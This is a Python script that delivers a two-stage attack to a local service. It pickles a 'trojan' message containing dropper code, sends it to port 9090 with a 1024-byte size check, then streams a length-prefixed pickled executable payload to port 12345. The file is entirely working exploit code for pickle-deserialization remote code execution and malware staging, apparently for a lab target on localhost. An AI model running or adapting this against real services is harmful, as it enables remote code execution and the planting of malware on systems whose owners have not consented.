import socket
import pickle
import struct
import re
from time import sleep
from InjectionTools import generate_message, generate_executable

def parse_source(fName, imported=None):
    include_re = re.compile(r'from \.(.*) import \*')
    if imported is None:
        imported = set()
    with open(fName, 'r') as f:
        res = []
        for ln in f:
            ln = ln.rstrip('\n')
            
            imp = include_re.search(ln)
            if imp is not None:
                imp = imp.group(1)
                if imp in imported:
                    res.append("# [INCLUDE] Skip {}".format(imp))
                else:
                    imported.add(imp)
                    res.append("# [INCLUDE] Begin {}".format(imp))
                    res += parse_source(imp, imported)
                    res.append("# [INCLUDE] End {}".format(imp))
            else:
                res.append(ln)
    return '\n'.join(res)

dropper_code = parse_source("Dropper.py")
payload_code = parse_source("Payload.py")

ip = "127.0.0.1"

sock = socket.socket()
sock.connect((ip, 9090))

trojan_msg = generate_message(dropper_code, 'Horse)))))')
pickled = pickle.dumps(trojan_msg)
size = len(pickled)
assert size <= 1024, "Dropper is too big, aborting. {} > 1024".format(size)
sock.send(pickled)
print("Dropper sent ({} bytes).".format(size))
sleep(0.5)

drop = socket.socket()
drop.connect((ip, 12345))

payload = pickle.dumps(generate_executable(payload_code))
length = len(payload)
drop.send(struct.pack("<L", length))
drop.send(payload)
drop.close()
print("Payload sent ({} bytes)".format(length))

sock.recv(1024)
sock.close()
